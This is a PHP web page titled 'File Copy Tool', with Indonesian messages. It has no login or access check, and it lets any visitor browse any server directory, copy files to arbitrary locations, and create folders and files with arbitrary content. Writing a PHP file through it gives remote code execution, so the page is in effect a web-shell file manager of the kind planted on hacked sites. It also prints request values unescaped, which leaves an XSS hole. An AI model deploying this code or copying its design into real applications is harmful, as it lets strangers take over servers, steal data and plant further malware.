<?php
// Set timezone
date_default_timezone_set("Asia/Jakarta");

$currentDir = isset($_GET['path']) ? $_GET['path'] : getcwd();
$currentDir = realpath($currentDir);

// Handle file copy
if (isset($_POST['copy']) && isset($_POST['files']) && isset($_POST['dest'])) {
    $dest = rtrim($_POST['dest'], '/');
    if (!is_dir($dest)) {
        mkdir($dest, 0777, true);
    }

    foreach ($_POST['files'] as $file) {
        $srcPath = $currentDir . '/' . $file;
        $destPath = $dest . '/' . basename($file);
        if (is_file($srcPath)) {
            copy($srcPath, $destPath);
        }
    }
    echo "<div style='background:#d4edda;padding:10px;color:#155724;'>File berhasil di-copy ke: $dest</div>";
}

// Add file
if (isset($_POST['add_file']) && !empty($_POST['file_name'])) {
    file_put_contents($currentDir . '/' . $_POST['file_name'], $_POST['file_content'] ?? '');
}

// Add folder
if (isset($_POST['add_folder']) && !empty($_POST['folder_name'])) {
    mkdir($currentDir . '/' . $_POST['folder_name'], 0777, true);
}

$files = scandir($currentDir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Copy Tool</title>
    <style>
        body { font-family: Arial; background: #f4f4f4; padding: 20px; }
        .topbar { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .file-list { background: #fff; padding: 10px; border-radius: 5px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f1f1f1; }
        .btn { padding: 6px 12px; border: none; background: #007bff; color: #fff; cursor: pointer; border-radius: 4px; }
        .btn-danger { background: #dc3545; }
        .btn-success { background: #28a745; }
    </style>
</head>
<body>

<div class="topbar">
    <div><b>Current Dir:</b> <?php echo $currentDir; ?></div>
    <div>
        <button onclick="document.getElementById('addFile').style.display='block'" class="btn btn-success">Add File</button>
        <button onclick="document.getElementById('addFolder').style.display='block'" class="btn btn-success">Add Folder</button>
    </div>
</div>

<form method="POST">
<div class="file-list">
    <table>
        <tr>
            <th><input type="checkbox" onclick="toggleCheckbox(this)"></th>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
        </tr>
        <?php foreach ($files as $f): 
            if ($f == "." || $f == "..") continue;
            $path = $currentDir . '/' . $f;
        ?>
        <tr>
            <td><input type="checkbox" name="files[]" value="<?php echo htmlspecialchars($f); ?>"></td>
            <td><?php echo htmlspecialchars($f); ?></td>
            <td><?php echo is_dir($path) ? 'Folder' : 'File'; ?></td>
            <td><?php echo is_file($path) ? filesize($path) . ' bytes' : '-'; ?></td>
        </tr>
        <?php endforeach; ?>
    </table>
</div>

<p>Destination Folder: <input type="text" name="dest" required placeholder="/path/to/destination" style="width:50%"></p>
<button type="submit" name="copy" class="btn">Copy Selected</button>
</form>

<!-- Add File Modal -->
<div id="addFile" style="display:none; background:#fff; padding:20px; position:fixed; top:20%; left:30%; border:1px solid #ccc;">
    <h3>Add File</h3>
    <form method="POST">
        <input type="text" name="file_name" placeholder="Filename" required><br><br>
        <textarea name="file_content" placeholder="File content..." rows="5" style="width:100%"></textarea><br><br>
        <button type="submit" name="add_file" class="btn">Create</button>
        <button type="button" onclick="this.parentElement.parentElement.style.display='none'" class="btn btn-danger">Cancel</button>
    </form>
</div>

<!-- Add Folder Modal -->
<div id="addFolder" style="display:none; background:#fff; padding:20px; position:fixed; top:20%; left:30%; border:1px solid #ccc;">
    <h3>Add Folder</h3>
    <form method="POST">
        <input type="text" name="folder_name" placeholder="Folder name" required><br><br>
        <button type="submit" name="add_folder" class="btn">Create</button>
        <button type="button" onclick="this.parentElement.parentElement.style.display='none'" class="btn btn-danger">Cancel</button>
    </form>
</div>

<script>
function toggleCheckbox(source) {
    checkboxes = document.getElementsByName('files[]');
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
}
</script>

</body>
</html>
